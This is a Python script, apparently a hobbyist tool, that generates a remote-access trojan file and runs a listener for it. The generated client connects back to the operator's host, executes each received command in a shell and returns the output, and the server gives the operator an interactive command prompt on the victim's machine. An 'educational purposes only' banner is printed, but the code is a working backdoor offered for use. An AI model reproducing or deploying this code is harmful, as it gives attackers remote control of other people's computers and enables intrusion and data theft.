

import argparse
import os
import time as t 
import socket
import sys
from colorama import Fore
import platform

#Colors

green = Fore.GREEN
fail = Fore.RED
warning = Fore.YELLOW
reset = Fore.RESET

#Arguments set

parser = argparse.ArgumentParser(description='Kewl shit')

parser.add_argument('-t', '--target', help='Sets The Host')

parser.add_argument('-p', '--port', help='Sets The Host Port', type=int)

parser.add_argument('-n', '--name', help='Sets The Clients Name')

args = parser.parse_args()

#Server Stuff

target = args.target
port = args.port
name = args.name

#Functions

def cls():
  if platform =='linux' or 'darwin':
    os.system('clear')
  else:
    os.system('cls')
    
def setup(target):
  server = socket.socket()
  server.bind((target, port))
  with open(f'{name}.py', 'w') as f:
    f.write(f"""import socket
import subprocess

REMOTE_HOST = '{target}' # '192.168.43.82'
REMOTE_PORT = {port} # 2222
client = socket.socket()
print("[-] Connection Initiating...")
client.connect((REMOTE_HOST, REMOTE_PORT))
print("[-] Connection initiated!")

while True:
    print("[-] Awaiting commands...")
    command = client.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    print("[-] Sending response...")
    client.send(output + output_error)""")
    f.close()
  print(f"{warning}       [+] Created Backdoor/Rat File ! [+]")
  print(f"{warning}       [+] Server Running On Port {port} [+]")
  print(f"{warning}       [+] Listening To A Connection ! [+]{reset}")
  server.listen(1)
  client, client_addr = server.accept()
  print(f"{warning}           [+]{client_addr}[+]\n\n")
  while True:
    cmd = input("Enter Command: ")
    cmd = cmd.encode()
    client.send(cmd)
    print('[+] Command Sent [+]')
    output = client.recv(1024)
    output = output.decode()
    print(f"[+] {output} [+]")
      
    
  

def main():
  setup(target)

if __name__ == '__main__':
  cls()
  print(f"""{green}                       
                       _        _____ _____ _____ 
                      | |      |_   _|_   _|_   _|
 ___ _ __   __ _  __ _| |__   ___| |   | |   | |  
/ __| '_ \ / _` |/ _` | '_ \ / _ \ |   | |   | |  
\__ \ |_) | (_| | (_| | | | |  __/ |   | |  _| |_ 
|___/ .__/ \__,_|\__, |_| |_|\___\_/   \_/  \___/ 
    | |           __/ |                           
    |_|          |___/     {reset} Version: {warning}1.0{reset}\n\n""")
  print(f"{fail} PLEASE NOTE THAT THIS IS MADE FOR EDUCATIONAL PURPOSES ONLY!")
  print(f"{fail}       DO NOT USE THIS FOR BLACK HAT HACKING !")
  print(f"{fail}       TO SEE OUR FULL ToS GO TO 'url'\n\n")
  main()
